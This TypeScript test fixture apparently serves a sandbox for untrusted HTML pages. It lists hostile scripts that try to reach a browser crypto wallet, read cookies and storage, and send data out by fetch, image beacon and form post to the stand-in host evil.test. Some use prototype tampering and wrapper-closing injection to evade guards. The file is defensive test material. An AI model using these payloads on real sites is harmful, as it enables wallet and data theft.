export type HostileFloor = {
  name: string;
  html: string;
  /** The static rule set that rejects it. "runtime" means no static rule sees it: only the runtime stops it. */
  caughtBy: "core" | "extended" | "runtime";
  /** What the runtime does with the static gate switched off. */
  runtime: "contained" | "navigation" | "refused";
};

const floor = (script: string, body = ""): string =>
  `<!doctype html><html><head><meta charset="utf-8"><title>t</title></head><body>${body}<script>${script}</script></body></html>`;

/** Builds the wallet's name from pieces, as a floor hiding from the static rules would. */
const hidden = (script: string, body = ""): string =>
  floor(`const k = ["eth", "ereum"].join(""); const reach = function (w) { if (w && w[k]) w[k].request({}); }; ${script}`, body);

export const HOSTILE_FLOORS: HostileFloor[] = [
  { name: "wallet call through window", html: floor('window.ethereum.request({ method: "eth_requestAccounts" });'), caughtBy: "extended", runtime: "contained" },
  { name: "wallet call as a bare name", html: floor('ethereum.request({ method: "eth_requestAccounts" });'), caughtBy: "extended", runtime: "contained" },
  { name: "wallet through a sloppy this", html: floor("const w = (function () { return this; })(); if (w) w.ethereum.request({});"), caughtBy: "extended", runtime: "contained" },
  { name: "wallet through defaultView", html: floor("document.defaultView.ethereum.request({});"), caughtBy: "extended", runtime: "contained" },
  { name: "wallet name built from pieces", html: floor('const k = ["eth", "ereum"].join(""); if (window[k]) window[k].request({});'), caughtBy: "extended", runtime: "contained" },
  { name: "wallet discovery through a bubbling event", html: floor('window.addEventListener("eip6963:announceProvider", function (e) { e.detail.provider.request({}); }); document.dispatchEvent(new CustomEvent("eip6963:requestProvider", { bubbles: true }));'), caughtBy: "extended", runtime: "contained" },
  { name: "fetch exfiltration", html: floor('fetch("https://evil.test/x");'), caughtBy: "extended", runtime: "contained" },
  { name: "image beacon", html: floor('const i = document.createElement("img"); i.src = "https://evil.test/b"; document.body.appendChild(i);'), caughtBy: "extended", runtime: "contained" },
  { name: "iframe realm trick", html: floor('const f = document.createElement("iframe"); document.body.appendChild(f); f.contentWindow.ethereum.request({});'), caughtBy: "core", runtime: "contained" },
  { name: "inline handler through innerHTML", html: floor('document.body.innerHTML = "<img src=x onerror=\\"ethereum.request({})\\">";'), caughtBy: "extended", runtime: "contained" },
  { name: "script inserted through innerHTML", html: floor('document.body.innerHTML = "<script>ethereum.request({})</scr" + "ipt>";'), caughtBy: "extended", runtime: "contained" },
  { name: "self-navigation", html: floor('setTimeout(function () { document.location = "/evil"; }, 50);'), caughtBy: "core", runtime: "navigation" },
  { name: "form post", html: floor('const form = document.getElementById("f"); form.setAttribute("action", "https://evil.test/"); form.submit();', '<form id="f" method="post"><input name="a" value="1"></form>'), caughtBy: "extended", runtime: "contained" },
  { name: "storage read", html: floor('localStorage.getItem("wagmi.store");'), caughtBy: "extended", runtime: "contained" },
  { name: "cookie read", html: floor("const c = document.cookie;"), caughtBy: "extended", runtime: "contained" },
  { name: "eval", html: floor('eval("ethereum.request({})");'), caughtBy: "extended", runtime: "contained" },
  { name: "Function through a constructor", html: floor('const g = (function () {}).constructor("return this")(); g.ethereum.request({});'), caughtBy: "extended", runtime: "contained" },
  { name: "string timer", html: floor('setTimeout("ethereum.request({})", 0);'), caughtBy: "extended", runtime: "contained" },
  { name: "timer this", html: floor("setTimeout(function () { if (this) this.ethereum.request({}); }, 0);"), caughtBy: "extended", runtime: "contained" },
  { name: "listener this", html: floor('window.addEventListener("x", function () { if (this) this.ethereum.request({}); }); document.body.dispatchEvent(new Event("x", { bubbles: true }));'), caughtBy: "extended", runtime: "contained" },
  { name: "window through composedPath", html: floor('document.addEventListener("click", function (e) { e.composedPath().forEach(function (t) { if (t && t.ethereum) t.ethereum.request({}); }); }); document.body.click();'), caughtBy: "extended", runtime: "contained" },
  { name: "valueOf on the restricted window", html: hidden("reach(window.valueOf());"), caughtBy: "extended", runtime: "contained" },
  { name: "bind replaced to catch the real window", html: hidden("Function.prototype.bind = function (w) { reach(w); return this; }; const m = window.matchMedia;"), caughtBy: "extended", runtime: "contained" },
  { name: "call replaced to catch a native getter", html: hidden('const saved = Function.prototype.call; let native = null; Function.prototype.call = function (t, ...a) { if (t instanceof Event && !native) native = this; return Reflect.apply(this, t, a); }; window.addEventListener("x", function (e) { const t = e.target; Function.prototype.call = saved; if (native) reach(Reflect.apply(native, e, [])); }); Reflect.apply(EventTarget.prototype.dispatchEvent, undefined, [new Event("x")]);'), caughtBy: "extended", runtime: "contained" },
  { name: "filter replaced to read composedPath", html: hidden('Array.prototype.filter = function () { for (let i = 0; i < this.length; i += 1) reach(this[i]); return []; }; document.addEventListener("click", function (e) { e.composedPath(); }); document.body.click();'), caughtBy: "runtime", runtime: "contained" },
  { name: "wallet discovery with the guard's methods replaced", html: hidden('const t = ["eip", "6963:"].join(""); String.prototype.indexOf = function () { return -1; }; Event.prototype.stopImmediatePropagation = function () {}; window.addEventListener(t + "announceProvider", function (e) { if (e.detail && e.detail.provider) e.detail.provider.request({}); }); EventTarget.prototype.dispatchEvent.call(undefined, new CustomEvent(t + "requestProvider"));'), caughtBy: "runtime", runtime: "contained" },
  { name: "handler on the body gets the window as this", html: hidden("document.body.onload = function () { reach(this); };"), caughtBy: "runtime", runtime: "contained" },
  { name: "bare handler gets the window as this", html: hidden("onload = function () { reach(this); };"), caughtBy: "runtime", runtime: "contained" },
  { name: "srcElement", html: hidden('window.addEventListener("x", function (e) { reach(e.srcElement); }); EventTarget.prototype.dispatchEvent.call(undefined, new Event("x"));'), caughtBy: "extended", runtime: "contained" },
  { name: "listener added with no receiver", html: hidden('EventTarget.prototype.addEventListener.call(undefined, "x", function () { reach(this); }); EventTarget.prototype.dispatchEvent.call(undefined, new Event("x"));'), caughtBy: "runtime", runtime: "contained" },
  { name: "document.open with three arguments", html: hidden('reach(document.open("", "_self", ""));'), caughtBy: "runtime", runtime: "contained" },
  { name: "frame element's window", html: hidden('const s = document.createElement("frameset"); const f = document.createElement("frame"); s.appendChild(f); document.documentElement.appendChild(s); setTimeout(function () { const c = f.contentWindow; if (c) { reach(c); reach(c.parent); } }, 100);'), caughtBy: "core", runtime: "contained" },
  { name: "script that closes the wrapper early", html: floor("}}).call();ethereum.request({});(function(){{"), caughtBy: "core", runtime: "refused" },
];
